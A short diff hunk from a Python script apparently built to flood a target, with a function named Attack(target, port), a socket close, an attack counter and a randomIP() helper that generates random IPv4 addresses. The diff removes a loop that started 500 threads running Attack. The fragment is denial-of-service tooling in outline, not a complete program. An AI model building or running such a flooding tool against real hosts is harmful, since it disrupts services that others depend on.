@@ -22,9 +22,6 @@ def Attack(target, port):
             print(attack_num)
             
             s.close()
-            for i in range(500):
-                thread = threading.Thread(target = Attack)
-                thread.start()
             
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
